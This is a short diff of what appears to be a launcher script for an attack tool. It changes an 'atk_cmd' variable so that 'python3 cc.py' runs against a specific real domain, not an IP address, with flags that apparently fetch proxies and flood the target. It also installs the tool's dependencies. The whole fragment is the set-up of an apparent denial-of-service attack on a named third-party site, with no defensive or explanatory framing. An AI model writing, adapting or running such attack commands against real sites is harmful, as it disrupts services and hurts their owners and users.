@@ -7,7 +7,7 @@
 #
 #the command you want to exec
 
-atk_cmd="python3 cc.py -url http://64.225.82.186 -down -check -v 5"
+atk_cmd="python3 cc.py -url https://bygcloud.com -down -check -v 5"
 
 pip3 install requests pysocks
 
